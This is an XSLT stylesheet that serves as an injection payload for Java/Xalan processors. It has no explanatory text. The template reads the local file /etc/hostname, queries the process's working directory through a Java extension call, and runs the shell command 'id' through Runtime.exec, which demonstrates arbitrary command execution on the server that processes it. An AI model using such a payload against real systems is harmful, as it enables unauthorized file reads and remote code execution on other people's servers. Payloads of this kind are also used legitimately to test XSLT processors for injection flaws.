<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="2.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:java="http://xml.apache.org/xalan/java/"
  exclude-result-prefixes="java">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="document('file:///etc/hostname')"/>
    <xsl:value-of select="java:java.lang.System.getProperty('user.dir')"/>
    <xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('id')"/>
  </xsl:template>
</xsl:stylesheet>